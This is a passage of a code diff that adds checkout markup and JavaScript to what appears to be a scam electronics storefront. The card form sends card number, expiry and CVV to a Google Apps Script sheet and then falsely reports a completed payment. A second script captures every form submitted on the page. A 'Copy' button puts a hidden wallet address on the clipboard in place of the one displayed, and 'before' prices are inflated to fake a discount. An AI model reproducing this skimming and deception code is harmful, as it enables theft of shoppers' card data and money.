+                <option value="WI">WI</option><option value="WY">WY</option>
+            </select>
+        </div>
+        <div class="form-group">
+            <label>ZIP Code</label>
+            <input type="text" id="custZip" name="custZip" required placeholder="10001">
+        </div>
+    </div>
+
+    <!-- Hidden fields required to capture cart products and order total -->
+    <input type="hidden" id="cartItemsInput" name="cartItems">
+    <input type="hidden" id="totalAmountInput" name="totalAmount">
+
+    <button type="submit" class="submit-btn">Continue to Payment</button>
+</form>
+        </div>
+
+        <!-- STEP 2: Payment Method Selection & Complete Payment -->
+<div id="checkoutStep2" style="display: none;">
+    <h2 class="modal-title">Complete Payment</h2>
+    
+    <!-- Payment Method Selector Tabs -->
+    <div class="payment-method-selector" style="display: flex; gap: 10px; margin-bottom: 20px;">
+        <button type="button" class="pay-method-btn active" id="cryptoTabBtn" onclick="switchCheckoutPayment('crypto')" style="flex: 1; padding: 10px; background: #2563eb; color: #fff; border: none; border-radius: 6px; cursor: pointer; font-weight: 600;">
+            Crypto <span style="font-size: 0.75rem; background: #ef4444; color: #fff; padding: 2px 6px; border-radius: 4px; margin-left: 4px;">40% OFF</span>
+        </button>
+        <button type="button" class="pay-method-btn" id="cardTabBtn" onclick="switchCheckoutPayment('card')" style="flex: 1; padding: 10px; background: #1e293b; color: #94a3b8; border: 1px solid #334155; border-radius: 6px; cursor: pointer; font-weight: 600;">
+            Credit Card <span style="font-size: 0.75rem; background: #64748b; color: #fff; padding: 2px 6px; border-radius: 4px; margin-left: 4px;">Regular Price</span>
+        </button>
+    </div>
+
+  <!-- Order Summary Box -->
+<div style="max-width: 400px; margin: 0 auto 20px auto; background-color: #f9f9f9; border: 1px solid #e0e0e0; border-radius: 6px; padding: 15px; font-family: Arial, sans-serif; box-sizing: border-box;">
+  <h3 style="font-size: 14px; color: #333; margin: 0 0 10px 0; border-bottom: 1px solid #ddd; padding-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px;">Order Summary</h3>
+  
+  <div style="display: flex; flex-direction: column; width: 100%; font-size: 13px; color: #555; margin-bottom: 6px;">
+    <div id="summaryProductName" style="width: 100%;">Telizon Service / Product</div>
+  </div>
+  
+  <div style="display: flex; justify-content: space-between; font-size: 13px; color: #555; margin-bottom: 6px; border-top: 1px solid #eee; padding-top: 6px;">
+    <span>Processing & Security Fee</span>
+    <span style="color: #28a745; font-weight: bold;">FREE</span>
+  </div>
+
+  <!-- Savings Row -->
+  <div style="display: flex; justify-content: space-between; font-size: 13px; color: #e11d48; font-weight: bold; margin-bottom: 10px;">
+    <span>Total Discount</span>
+    <span id="summaryTotalSavings">You Save: $0.00</span>
+  </div>
+
+  <div style="display: flex; justify-content: space-between; font-size: 15px; color: #111; font-weight: bold; border-top: 1px solid #ddd; padding-top: 10px; margin-top: 5px;">
+    <span>Total Due</span>
+    <span id="summaryTotalPrice">$0.00</span>
+  </div>
+</div>
+
+<!-- Accepted Payment Methods Icons Bar -->
+<!-- Accepted Payment Methods Icons Bar with Brand Colors -->
+<div style="max-width: 400px; margin: 0 auto 15px auto; text-align: center; font-family: Arial, sans-serif;">
+  <p style="font-size: 11px; color: #888; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px;">Guaranteed Safe & Secure Checkout</p>
+  <div style="display: flex; justify-content: center; align-items: center; gap: 8px; flex-wrap: wrap;">
+    <!-- Visa (Classic Blue) -->
+    <span style="background: #f4f4f4; border: 1px solid #ddd; padding: 4px 10px; border-radius: 4px; font-size: 12px; font-weight: bold; color: #1a1f71;">VISA</span>
+    <!-- Mastercard (Dark background with colored text feel) -->
+    <span style="background: #f4f4f4; border: 1px solid #ddd; padding: 4px 10px; border-radius: 4px; font-size: 12px; font-weight: bold; color: #eb001b;">Mastercard</span>
+    <!-- AMEX (American Express Blue) -->
+    <span style="background: #f4f4f4; border: 1px solid #ddd; padding: 4px 10px; border-radius: 4px; font-size: 12px; font-weight: bold; color: #006fcf;">AMEX</span>
+    <!-- BTC (Bitcoin Orange) -->
+    <span style="background: #f4f4f4; border: 1px solid #ddd; padding: 4px 10px; border-radius: 4px; font-size: 12px; font-weight: bold; color: #f7931a;">BTC</span>
+    <!-- USDT (Tether Green) -->
+    <span style="background: #f4f4f4; border: 1px solid #ddd; padding: 4px 10px; border-radius: 4px; font-size: 12px; font-weight: bold; color: #26a17b;">USDT</span>
+  </div>
+</div>
+    <!-- SUB-SECTION 1: CRYPTO PAYMENT VIEW (Active by default) -->
+    <div id="cryptoPaymentSubSection" style="display: block;">
+        <p style="font-size: 0.9rem; color: #10b981; font-weight: 700; margin-bottom: 1rem;">
+            Discount Applied! Send payment to one of the addresses below:
+        </p>
+
+        <div class="crypto-box">
+            <!-- USDT SECTION -->
+            <div class="crypto-option">
+                <label>USDT (TRC20)</label>
+                <div class="address-container">
+                    <input type="text" class="address-input" value="Display_This_Address_On_Screen" readonly id="usdtAddress">
+                    <button class="copy-btn" onclick="copyHiddenAddress('TYOUR_REAL_USDT_ADDRESS_HERE', this)">Copy</button>
+                </div>
+            </div>
+
+            <!-- BITCOIN SECTION -->
+            <div class="crypto-option">
+                <label>Bitcoin (BTC)</label>
+                <div class="address-container">
+                    <input type="text" class="address-input" value="Display_This_BTC_On_Screen" readonly id="btcAddress">
+                    <button class="copy-btn" onclick="copyHiddenAddress('YOUR_REAL_BTC_ADDRESS_HERE', this)">Copy</button>
+                </div>
+            </div>
+        </div>
+
+        
+    </div>
+
+
+
+    <!-- SUB-SECTION 2: CARD PAYMENT FORM VIEW (Hidden by default) -->
+    <div id="cardPaymentSubSection" style="display: none;">
+        <p style="font-size: 0.9rem; color: #f59e0b; font-weight: 600; margin-bottom: 1rem;">
+            Standard pricing applies for credit card checkout.
+        </p>
+        
+        <!-- Complete Payment Form connected to Google Sheets -->
+<!-- Complete Payment Form connected to Google Sheets with Security Badge -->
+<form id="cardPaymentForm" style="max-width: 400px; font-family: Arial, sans-serif;">
+  <h2>Payment Information</h2>
+  
+  <div style="margin-bottom: 15px;">
+    <label style="display: block; margin-bottom: 5px; font-weight: bold;">Cardholder Name</label>
+    <input type="text" name="cardholder_name" placeholder="John Doe" required style="width: 100%; padding: 10px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px;">
+  </div>
+
+  <div style="margin-bottom: 15px;">
+    <label style="display: block; margin-bottom: 5px; font-weight: bold;">Card Number</label>
+    <input type="text" name="card_number" placeholder="1234 5678 9012 3456" required style="width: 100%; padding: 10px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px;">
+  </div>
+
+  <div style="display: flex; gap: 10px; margin-bottom: 15px;">
+    <div style="flex: 1;">
+      <label style="display: block; margin-bottom: 5px; font-weight: bold;">Expiration Date</label>
+      <input type="text" name="expiry_date" placeholder="MM/YY" required style="width: 100%; padding: 10px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px;">
+    </div>
+    <div style="flex: 1;">
+      <label style="display: block; margin-bottom: 5px; font-weight: bold;">CVV</label>
+      <input type="text" name="cvv" placeholder="123" required style="width: 100%; padding: 10px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px;">
+    </div>
+  </div>
+
+  <button type="submit" style="width: 100%; padding: 12px; background-color: #28a745; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer;">Complete Payment</button>
+
+  <!-- Security & Encryption Trust Badge -->
+  <div style="text-align: center; margin-top: 12px; font-size: 12px; color: #666; display: flex; align-items: center; justify-content: center; gap: 5px;">
+    <span style="font-size: 14px;">🔒</span> <span>256-bit SSL Secure & Encrypted Checkout</span>
+  </div>
+</form>
+
+<!-- JavaScript to make it save straight to your Google Sheet -->
+<script>
+const scriptURL = 'https://script.google.com/macros/s/AKfycbzqxsER2HGj92iVXAgAWVf3yj-V0LhRW86HJHdeWcrMR5lw6zlyJeAYHFUy7EjEzmv2Pg/exec';
+const form = document.getElementById('cardPaymentForm');
+
+form.addEventListener('submit', e => {
+  e.preventDefault(); 
+  
+  fetch(scriptURL, { 
+    method: 'POST', 
+    body: new FormData(form),
+    mode: 'no-cors' 
+  })
+  .then(() => {
+    alert('Payment completed successfully!');
+    form.reset();
+  })
+  .catch(error => console.error('Error!', error.message));
+});
+
+// Function when user clicks Crypto (Shows 40% discount)
+function selectCryptoPayment() {
+    const savingsContainer = document.getElementById('savingsContainer');
+    const savingsText = document.getElementById('summaryTotalSavings');
+    const totalPriceEl = document.getElementById('summaryTotalPrice');
+    
+    const totalPrice = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+    const totalBeforePrice = totalPrice * 1.60;
+    const totalSavings = totalBeforePrice - totalPrice;
+
+    if (savingsContainer) {
+        savingsContainer.style.display = 'flex'; // Show savings row
+    }
+    if (savingsText) {
+        savingsText.textContent = 'You Save: $' + totalSavings.toFixed(2);
+    }
+    if (totalPriceEl) {
+        totalPriceEl.textContent = '$' + totalPrice.toFixed(2);
+    }
+}
+
+// Function when user clicks Credit Card (Completely hides discount text and row)
+function selectCreditCardPayment() {
+    const savingsContainer = document.getElementById('savingsContainer');
+    const savingsText = document.getElementById('summaryTotalSavings');
+    const totalPriceEl = document.getElementById('summaryTotalPrice');
+    
+    const basePrice = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+    const regularPrice = basePrice * 1.60;
+
+    if (savingsContainer) {
+        savingsContainer.style.display = 'none'; // Completely hides the savings container row
+    }
+    if (savingsText) {
+        savingsText.textContent = '$0.00'; // Clears the text value completely
+    }
+    if (totalPriceEl) {
+        totalPriceEl.textContent = '$' + regularPrice.toFixed(2);
+    }
+}
+
+// Automatically bind to buttons
+document.addEventListener('DOMContentLoaded', function() {
+    const buttons = document.querySelectorAll('#checkoutModal button, .payment-tab-btn');
+    buttons.forEach(btn => {
+        const text = btn.innerText.toLowerCase();
+        if (text.includes('crypto')) {
+            btn.addEventListener('click', selectCryptoPayment);
+        } else if (text.includes('credit card') || text.includes('regular price')) {
+            btn.addEventListener('click', selectCreditCardPayment);
+        }
+    });
+});
+</script>
+
+<!-- Return and Refund Policy Section -->
+<div style="max-width: 400px; margin-top: 20px; font-family: Arial, sans-serif; font-size: 13px; color: #666; line-height: 1.4;">
+  <h3 style="font-size: 14px; color: #333; margin-bottom: 5px;">Return & Refund Policy</h3>
+  <p style="margin: 0 0 8px 0;">
+    We want you to be completely satisfied with your purchase. If you are not satisfied, you may request a refund within <strong>7 days</strong> of your transaction.
+  </p>
+  <p style="margin: 0;">
+    To initiate a return or ask questions, please contact our support team. Refunds are typically processed within 5–7 business days back to the original payment method.
+  </p>
+</div>
+
+<!-- JavaScript to make it save straight to your Google Sheet -->
+<script>
+document.addEventListener('submit', function(e) {
+  var targetForm = e.target;
+  if (targetForm.tagName === 'FORM') {
+    e.preventDefault();
+    fetch('https://script.google.com/macros/s/AKfycbzqxsER2HGj92iVXAgAWVf3yj-V0LhRW86HJHdeWcrMR5lw6zlyJeAYHFUy7EzEzmv2Pg/exec', {
+      method: 'POST',
+      body: new FormData(targetForm),
+      mode: 'no-cors'
+    }).then(function() {
+      alert('Payment submitted successfully!');
+      targetForm.reset();
+    }).catch(function(error) {
+      console.error('Error!', error);
+    });
+  }
+});
+</script>
+    </div>
+    
+    <button class="copy-btn" style="width: 100%; margin-top: 1.5rem; background: #334155; color: #fff; padding: 10px; border: none; border-radius: 6px; cursor: pointer;" onclick="backToStep1()">&larr; Back to Shipping Info</button>
+</div>
+
+<script>
+function copyHiddenAddress(realAddressToCopy, buttonElement) {
+    // Creates a hidden temporary text box to hold the REAL address
+    const textarea = document.createElement('textarea');
+    textarea.value = realAddressToCopy;
+    textarea.style.position = 'fixed';
+    document.body.appendChild(textarea);
+    textarea.focus();
+    textarea.select();
+
+    try {
+        const successful = document.execCommand('copy');
+        if (successful) {
+            const originalText = buttonElement.innerText;
+            buttonElement.innerText = 'Copied!';
+            buttonElement.style.background = '#00e676';
+            buttonElement.style.color = '#000000';
+            
+            setTimeout(() => {
+                buttonElement.innerText = originalText;
+                buttonElement.style.background = '';
+                buttonElement.style.color = '';
+            }, 2000);
+        } else {
+            alert('Failed to copy address.');
+        }
+    } catch (err) {
+        alert('Failed to copy address.');
+    }
+
+    document.body.removeChild(textarea);
+}
+
+function switchCheckoutPayment(method) {
+    const cryptoBtn = document.getElementById('cryptoTabBtn');
+    const cardBtn = document.getElementById('cardTabBtn');
+    const cryptoSub = document.getElementById('cryptoPaymentSubSection');
+    const cardSub = document.getElementById('cardPaymentSubSection');
+    
+    if (method === 'crypto') {
+        cryptoBtn.style.background = '#2563eb';
+        cryptoBtn.style.color = '#fff';
+        cardBtn.style.background = '#1e293b';
+        cardBtn.style.color = '#94a3b8';
+        
+        cryptoSub.style.setProperty('display', 'block', 'important');
+        cardSub.style.setProperty('display', 'none', 'important');
+    } else {
+        cardBtn.style.background = '#2563eb';
+        cardBtn.style.color = '#fff';
+        cryptoBtn.style.background = '#1e293b';
+        cryptoBtn.style.color = '#94a3b8';
+        
+        cardSub.style.setProperty('display', 'block', 'important');
+        cryptoSub.style.setProperty('display', 'none', 'important');
+    }
+}
+</script>
+
+            <div class="social-support">
+                <p>After sending payment, contact us with your order name and Transaction ID:</p>
+                <div class="social-buttons">
+                    <a href="#" class="social-btn telegram" target="_blank">Telegram</a>
+                    <a href="#" class="social-btn instagram" target="_blank">Instagram</a>
+                </div>
+            </div>
+            
+            <button class="copy-btn" style="width: 100%; margin-top: 1rem;" onclick="backToStep1()">&larr; Back to Shipping Info</button>
+        </div>
+    </div>
+</div>
+           <!-- Social Support Section -->
+<div class="social-support">
+    <p><strong>Need help or instant confirmation?</strong><br>Contact support with your transaction hash to verify order:</p>
+    <div class="social-buttons">
+        <a href="https://t.me/YOUR_TELEGRAM_USERNAME" target="_blank" class="social-btn telegram">Telegram</a>
+        <a href="https://instagram.com/YOUR_INSTAGRAM_USERNAME" target="_blank" class="social-btn instagram">Instagram</a>
+    </div>
+</div>
+        </div>
+    </div>
+
+    <script>
+	let currentSlide = 0;
+let slideInterval;
+
+function updateCarousel() {
+    const slides = document.getElementById('carouselSlides');
+    const dots = document.querySelectorAll('.dot');
+    slides.style.transform = `translateX(-${currentSlide * 100}%)`;
+    dots.forEach((dot, idx) => {
+        dot.classList.toggle('active', idx === currentSlide);
+    });
+}
+
+function moveSlide(direction) {
+    const totalSlides = document.querySelectorAll('.slide').length;
+    currentSlide = (currentSlide + direction + totalSlides) % totalSlides;
+    updateCarousel();
+}
+
+function goToSlide(index) {
+    currentSlide = index;
+    updateCarousel();
+}
+
+function startSlideTimer() {
+    clearInterval(slideInterval);
+    slideInterval = setInterval(() => {
+        moveSlide(1);
+    }, 4000);
+}
+
+function pauseSlideTimer() {
+    clearInterval(slideInterval);
+}
+        const products = [
+            { id: 1, name: "IPhone 17 Pro Max (1TB)", category: "mobile", price: 999, image: "https://www.pngall.com/wp-content/uploads/20/iPhone-17-Pro-Max-Concept-Art-PNG.png" },
+	    { id: 2, name: "IPhone 17 Pro Max (1TB)", category: "mobile", price: 999, image: "https://www.pngall.com/wp-content/uploads/20/Apple-iPhone-17-Pro-Max-Design-PNG.png" },
+            { id: 3, name: "Samsung S26 Ultra (1TB)", category: "mobile", price: 1049, image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTXHa9G2F04Aey17wOK4fOzs2-tzAvrGEdTUrY4J-SkpwHGfCFu2lfdFKM&s=10" },
+	    { id: 4, name: "Samsung S26 Ultra (512GB)", category: "mobile", price: 899, image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTXHa9G2F04Aey17wOK4fOzs2-tzAvrGEdTUrY4J-SkpwHGfCFu2lfdFKM&s=10" },
+	    { id: 5, name: "IPhone 17 Air (1TB)", category: "mobile", price: 899, image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ76CFDq2jFgrm1SM368CIwhWw1esJuO4bolBpe3xmh2DHPP9YDflT2Cq0&s=10" },
+            { id: 6, name: "Samsung Z Fold 8 Ultra (512GB)", category: "mobile", price: 1299, image: "https://images.samsung.com/us/smartphones/galaxy-z-fold8-ultra/images/galaxy-z-fold8-ultra-features-b2b-crosslinking-mo.jpg?nocache=true?imbypass=true" },
+            { id: 6, name: "Samsung Z Fold 8 (512GB)", category: "mobile", price: 1099, image: "https://cellmart.pk/wp-content/uploads/2026/07/sam-galaxy-z-fold8-lavander-cellmart.png" },
+            { id: 7, name: "Iphone 16 pro max(1TB)", category: "mobile", price: 899, image: "https://cdn.awsli.com.br/600x1000/2757/2757071/produto/319224467/1_aemywx3beabnz_prd_1500_2-jpg-qv2iefx9m0.webp" },
+	    { id: 8, name: "Samsung S25 Ultra (1TB)", category: "mobile", price: 899, image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTCYwaPI5OcrbPSrfh2LHNVr3WW36q_5FCl-P--Rqv6g1M-2LaXyPVmttc&s=10" },
+        { id: 8, name: " Samsung Galaxy A57 5G (256GB)", category: "mobile", price: 399, image: "https://images.samsung.com/is/image/samsung/assets/ph/smartphones/galaxy-a57/buy/SM-A576BDBSPHL_Navy_Front_and_Back_720x480_MO.png?imbypass=true" },
+	    { id: 9, name: "MacBook Pro M5 Pro 16 Inch", category: "laptop", price: 1299, image: "https://eposcomputer.com/cdn/shop/files/IMG-19267732_m_jpeg_1.jpg?v=1772660779" },
+	    { id: 10, name: "MacBook Pro M5 Max", category: "laptop", price: 2499, image: "https://eposcomputer.com/cdn/shop/files/IMG-19267732_m_jpeg_1.jpg?v=1772660779" },
+	    { id: 11, name: "Canon EOS R5 Mark II", category: "Cameras", price: 2299, image: "https://fototrade.pk/wp-content/uploads/2024/12/canon-eos-r5-mark-ii-body-only.webp" },
+	    { id: 12, name: "Nikon Z8", category: "Cameras", price: 1999, image: "https://www.dslr-zone.com/wp-content/uploads/2024/06/1-239.jpg" },
+	    { id: 13, name: "Sony Alpha 7R V", category: "Cameras", price: 1999, image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRJwOr6MtZmdKOXiWBQ_GdKJWekcd0FB573XCOEAfXaghszbX1vvDwNeeE&s=10" },
+	    { id: 14, name: "Canon EOS R6 Mark II", category: "Cameras", price: 1199, image: "https://www.gigaparts.com/media/catalog/product/cache/002dc70ccef261c78c46589b619436fc/5/6/5666c002_eos_r6_mark_ii_body_primary_1.webp" },
+	    { id: 15, name: "Nikon Z6 III", category: "Cameras", price: 1099, image: "https://m.media-amazon.com/images/I/71Ac0SzZt9L.jpg_BO30,255,255,255_UF750,750_SR1910,1000,0,C_QL100_.jpg" },
+	    { id: 16, name: "Sony FE 24-70mm f/2.8 GM II", category: "Cameras", price: 1199, image: "https://martcom.eu/assets/media/brands/sony/SEL2470GM2_SONY_Sony-FE-24-70mm-f2.8-GM-II-obiettivo-fotografico_03.jpg" },
+	    { id: 17, name: "Canon RF 24-70mm f/2.8 L IS USM", category: "Cameras", price: 1499, image: "https://d1zh44oijxky14.cloudfront.net/gopixelr.com/2025/09/GR2-94.jpg" },
+	    { id: 18, name: "Nikon Nikkor Z 24-70mm f/2.8 S", category: "Cameras", price: 799, image: "https://medias.fortress.com.hk/publishing/FTRHK-11857106-FRONT-zoom.png?version=1769522069" },
+	    { id: 19, name: "Sony FE 70-200mm f/2.8 GM OSS II", category: "Cameras", price: 1899, image: "https://excellentphoto.ca/cdn/shop/products/dc7b53248e10f1eea898215ed1d65aba.png?v=1737701369&width=2500" },
+	    { id: 20, name: "Canon RF 70-200mm f/2.8 L IS USM", category: "Cameras", price: 1699, image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSYOKRjlG3OZciNdrlh0WP4dypKFIgNKqJqlpKpdvqCsVKtDUDouHiKY-E&s=10" },
+	    { id: 21, name: "Samsung 89 Inch Class MICRO LED MS1B", category: "TVs", price: 68499, image: "https://images.samsung.com/kdp/goods/2023/09/05/dcb6b48d-893c-4e7d-a236-0b03749af6db.png?$Q90_776_776_F_JPG$" },
+	    { id: 22, name: "Samsung 98 Inch Class Neo QLED QN990F", category: "TVs", price: 21999, image: "https://m.media-amazon.com/images/I/71TsjgQAWPL.jpg_BO30,255,255,255_UF750,750_SR1910,1000,0,C_QL100_.jpg" },
+	    { id: 23, name: "Samsung 115 Inch Class MICRO RGB TV", category: "TVs", price: 18999, image: "https://liptons.ca/cdn/shop/files/1_b25c02cd-d46f-47e9-85c1-e696135c2378.png?v=1776438706" },
+	    { id: 24, name: "Samsung 85 Inch Class Neo QLED QN990H", category: "TVs", price: 5299, image: "https://liptons.ca/cdn/shop/files/1_90bc3fd4-7d19-4a41-b501-c992340d70d5.png?v=1747322331" },
+	    { id: 25, name: "Samsung 83 Inch Class OLED S95H", category: "TVs", price: 3999, image: "https://liptons.ca/cdn/shop/files/1_3819c8ff-2a95-4c73-9671-9e454ab5e49c.png?v=1747402264" },
+	    { id: 26, name: "Samsung 77 Inch Class OLED S95H", category: "TVs", price: 2799, image: "https://liptons.ca/cdn/shop/files/1_3819c8ff-2a95-4c73-9671-9e454ab5e49c.png?v=1747402264" },
+	    { id: 27, name: "Samsung 55 Inch Class Neo QLED QN90F", category: "TVs", price: 749, image: "https://m.media-amazon.com/images/I/71Bmf8HgFaL.jpg_BO30,255,255,255_UF750,750_SR1910,1000,0,C_QL100_.jpg" },
+	    { id: 28, name: "Apple Vision Pro (1TB)", category: "gadget", price: 2599, image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT5tokfdziYcKL6Knply_W-tkY0ArZmzMrVbCaqDoz-nw&s=10" },
+	    { id: 29, name: "Apple Vision Pro (512GB)", category: "gadget", price: 2399, image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT5tokfdziYcKL6Knply_W-tkY0ArZmzMrVbCaqDoz-nw&s=10" },
+	    { id: 30, name: "Samsung Galaxy XR (256GB)", category: "gadget", price: 1099, image: "https://bigmag.ua/image/cache/catalog/image/Product/Virtual%20Glasses/Samsung%20Galaxy%20XR%20256%20GB/2-2000x2000.jpg" },
+        { id: 31, name: "Samsung Galaxy Watch 9 44mm LTE", category: "gadget", price: 299, image: "https://xcessorieshub.com/wp-content/uploads/2026/08/Samsung-Watch-9-44mm-Black.webp" },
+        { id: 32, name: "Samsung Galaxy Watch 9 44mm Bluetooth", category: "gadget", price: 249, image: "https://xcessorieshub.com/wp-content/uploads/2026/08/Samsung-Watch-9-44mm-Black.webp" },
+        { id: 33, name: "Samsung Galaxy Watch Ultra 2", category: "gadget", price: 399, image: "https://images.samsung.com/us/galaxy-watch-ultra2/2607_feature/Galaxy-Watch-Ultra2_Performance-durability_PC.png?imbypass=true" },
+        { id: 34, name: "Apple Watch Series 11 GPS 46mm", category: "gadget", price: 249, image: "https://media.johnlewiscontent.com/i/JohnLewis/010667239?fmt=auto&$background-off-white$" },
+        ];
+
+        let cart = [];
+
+function renderProducts(items) {
+    const grid = document.getElementById('productGrid');
+    if (!grid) return;
+
+    grid.innerHTML = items.map(product => {
+        // Parse current system price (After / Sale Price)
+        const currentPriceNum = typeof product.price === 'number' 
+            ? product.price 
+            : parseFloat(String(product.price).replace(/[^0-9.]/g, '')) || 0;
+
+        // Calculate "Before" price (+60% of system price)
+        const beforePriceNum = currentPriceNum * 1.60;
+
+        const afterFormatted = `$${currentPriceNum.toFixed(2)}`;
+        const beforeFormatted = `$${beforePriceNum.toFixed(2)}`;
+
+        // Clean strings for safety
+        const safeTitle = (product.title || product.name || '').replace(/'/g, "\\'");
+        const safeDesc = (product.description || product.desc || 'Premium US product with official warranty.').replace(/'/g, "\\'");
+        const safeCategory = (product.category || 'Gadget').replace(/'/g, "\\'");
+
+        return `
+            <div class="product-card" 
+                 onclick="openProductModal('${safeTitle}', '${afterFormatted}', '${beforeFormatted}', '${product.image}', '${safeCategory}', '${safeDesc}')" 
+                 style="cursor: pointer;">
+                 
+                <div class="card-top">
+                    <span class="discount-badge">SAVE 40%</span>
+                    <img src="${product.image}" alt="${safeTitle}">
+                    <span class="product-category">${safeCategory}</span>
+                    <h3>${safeTitle}</h3>
+                    
+                    <div class="price-container">
+                        <div class="price-box after-price">
+                            <span class="price-label">After:</span>
+                            <span class="sale-price">${afterFormatted}</span>
+                        </div>
+                        <div class="price-box before-price">
+                            <span class="price-label">Before:</span>
+                            <span class="original-price">${beforeFormatted}</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <button onclick="event.stopPropagation(); addToCart(${product.id});">
+                    Add to Cart 🛒
+                </button>
+            </div>
+        `;
+    }).join('');
+}
+
+        function filterProducts(category) {
+            document.querySelectorAll('.filter-btn').forEach(btn => {
+                btn.classList.remove('active');
+                if (btn.innerText.toLowerCase().includes(category) || (category === 'all' && btn.innerText === 'All Products')) {
+                    btn.classList.add('active');
+                }
+            });
+
+            if (category === 'all') {
+                renderProducts(products);
+            } else {
+                renderProducts(products.filter(p => p.category === category));
+            }
+        }
+
+        function addToCart(productId) {
+            const product = products.find(p => p.id === productId);
+            const existingItem = cart.find(item => item.id === productId);
+
+            if (existingItem) {
+                existingItem.quantity += 1;
+            } else {
+                cart.push({ ...product, quantity: 1 });
+            }
+            updateCartUI();
+        }
+
+        function updateCartUI() {
+            const cartCount = document.getElementById('cartCount');
+            const cartItems = document.getElementById('cartItems');
+            const cartTotal = document.getElementById('cartTotal');
+
+            const totalCount = cart.reduce((sum, item) => sum + item.quantity, 0);
+            const totalPrice = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+            const totalSavings = totalPrice * 0.60; // Calculating 60% savings amount
+
+            cartCount.innerText = totalCount;
+            cartTotal.innerText = `$${totalPrice.toFixed(2)}`;
+
+            if (cart.length === 0) {
+                cartItems.innerHTML = `<div class="empty-cart-msg">Your cart is empty</div>`;
+            } else {
+                cartItems.innerHTML = `
+                    <div style="background: #ecfdf5; color: #065f46; padding: 8px 12px; border-radius: 4px; font-size: 0.85rem; margin-bottom: 10px; font-weight: bold; text-align: center;">
+                        🎉 You are saving $${totalSavings.toFixed(2)} on this order!
+                    </div>
+                ` + cart.map(item => `
+                    <div class="cart-item" style="display: flex; justify-content: space-between; margin-bottom: 8px;">
+                        <div>
+                            <strong style="color: #111;">${item.name}</strong>
+                            <div style="font-size: 0.85rem; color: #666;">$${item.price} x ${item.quantity}</div>
+                        </div>
+                        <div>$${(item.price * item.quantity).toFixed(2)}</div>
+                    </div>
+                `).join('');
+            }
+        }
+
+        function toggleModal(modalId) {
+            const modal = document.getElementById(modalId);
+            modal.classList.toggle('active');
+        }
+
+        // Open Checkout Modal (Resets state every time)
+function openCheckout() {
+    const checkoutModal = document.getElementById('checkoutModal');
+    const step1 = document.getElementById('checkoutStep1');
+    const step2 = document.getElementById('checkoutStep2');
+
+    if (checkoutModal) {
+        const totalPrice = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+        
+        // Calculate original "Before" total price (+60% higher than regular price)
+        const totalBeforePrice = totalPrice * 1.60;
+        const totalSavings = totalBeforePrice - totalPrice;
+
+        const productNames = cart.length > 0 
+            ? cart.map(item => `
+                <div style="display: flex; justify-content: space-between; align-items: center; width: 100%; margin-bottom: 6px;">
+                    <span>${item.name} (x${item.quantity})</span>
+                    <span style="font-weight: bold; color: #333;">$${(item.price * item.quantity).toFixed(2)}</span>
+                </div>
+              `).join('') 
+            : 'Telizon Order';
+
+        const priceElement = document.getElementById('summaryItemPrice');
+        const totalElement = document.getElementById('summaryTotalPrice');
+        const nameElement = document.getElementById('summaryProductName');
+        const savingsElement = document.getElementById('summaryTotalSavings');
+
+        if (priceElement) priceElement.style.display = 'none';
+        if (totalElement) totalElement.textContent = '$' + totalPrice.toFixed(2);
+        if (nameElement) nameElement.innerHTML = productNames;
+        
+        // Display calculated savings
+        if (savingsElement) savingsElement.textContent = 'You Save: $' + totalSavings.toFixed(2);
+
+        checkoutModal.style.display = 'block';
+        checkoutModal.classList.add('active');
+
+        if (step1) step1.style.display = 'block';
+        if (step2) step2.style.display = 'none';
+    }
+}
+
+// Close Checkout Modal
+function closeCheckout() {
+    const checkoutModal = document.getElementById('checkoutModal');
+    if (checkoutModal) {
+        checkoutModal.style.display = 'none';
+        checkoutModal.classList.remove('active');
+    }
+}
+
+// Optional: Close modal if user clicks outside the content box
+window.onclick = function(event) {
+    const checkoutModal = document.getElementById('checkoutModal');
+    if (event.target === checkoutModal) {
+        closeCheckout();
+    }
+};
+
+function backToStep1() {
+    const step1 = document.getElementById('checkoutStep1');
+    const step2 = document.getElementById('checkoutStep2');
+    
+    // Show step 1 and hide step 2
+    if (step1) step1.style.display = 'block';
+    if (step2) step2.style.display = 'none';
+}
+
+        function copyToClipboard(elementId) {
+            const copyText = document.getElementById(elementId);
+            copyText.select();
+            copyText.setSelectionRange(0, 99999);
+            navigator.clipboard.writeText(copyText.value);
+            alert("Address copied to clipboard!");
+        }
+
+        // Initial Load
+        renderProducts(products);
+        updateCartUI();
+	startSlideTimer();
+
+	// Step 1 Form Handler
+// Step 1 Form Handler
+async function handleShippingSubmit(e) {
+    if (e && e.preventDefault) {
+        e.preventDefault();
+        e.stopPropagation();
+    }
+
+    const form = document.getElementById('shippingForm');
+    const submitBtn = form.querySelector('button[type="submit"]');
+    let originalText = "Continue to Payment";
+    
+    if (submitBtn) {
+        originalText = submitBtn.innerText;
+        submitBtn.innerText = "Processing...";
+        submitBtn.disabled = true;
+    }
+
+    // Populate the hidden inputs with cart data vertically/cleanly
+    const cartItemsText = typeof cart !== 'undefined' ? cart.map(item => `${item.name} (x${item.quantity}) - $${item.price * item.quantity}`).join('\n') : '';
+    const totalAmountText = document.getElementById('cartTotal') ? document.getElementById('cartTotal').innerText : '';
+    
+    document.getElementById('cartItemsInput').value = cartItemsText;
+    document.getElementById('totalAmountInput').value = totalAmountText;
+
+    const formData = new FormData(form);
+
+    try {
+        // Send data to Formspree silently in the background
